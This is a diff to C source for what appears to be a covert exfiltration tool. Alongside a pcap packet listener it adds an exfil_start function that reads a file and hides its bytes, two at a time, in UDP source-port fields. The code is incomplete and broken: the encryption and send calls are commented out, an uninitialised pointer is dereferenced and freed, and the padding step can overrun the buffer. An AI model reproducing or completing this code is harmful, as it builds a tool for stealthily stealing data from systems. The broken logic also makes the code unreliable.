@@ -5,10 +5,9 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
 
-#include "capture.h"
+#include "server.h"
 #include "crypto.h"
 #include "util.h"
-#include "defs.h"
 
 #define ETHER_IP_UDP_LEN 44
 #define SRC_OFF 		28 // Source address, so we know where to send results
@@ -41,6 +40,48 @@ void srv_listen(int duplex)
 		if (pcap_dispatch(nic, -1, pkt_handler, (u_char*)duplex) < 0)
 			error("pcap_loop");
 		usleep(5000); // sleep 5ms
+	}
+}
+
+#define SLEEP_TIME 100000
+void exfil_start(uint32 ipaddr)
+{
+	int buflen;
+	char buffer[MAX_LEN];
+	char *pbuf;
+	FILE *file;
+
+	file = open_file("abc", FALSE);
+
+	while ((buflen = fread(buffer, 1, MAX_LEN, file)) > 0)
+	{
+		pbuf = buffer;
+
+		// Pad non-even sequences with a space ...
+		if (buflen % 2 != 0)
+		{
+			buffer[buflen - 1] = ' ';
+			buffer[buflen] = 0;
+			++buflen;
+		}
+
+		for (int i = 0; i < buflen;)
+		{
+			char *enc;
+			ushort src_port = 0;
+			ushort dst_port = 0;
+
+			//enc = encrypt(SEKRET_KEY, pbuf, 2);
+			src_port = (enc[0] << 8) + enc[1];
+			//dst_port = PORT_NTP;
+			free(enc);
+
+			//_send(dest, src_port, dst_port, TRUE);
+
+			i += 2;
+			pbuf += 2;
+			usleep(SLEEP_TIME);
+		}
 	}
 }
 
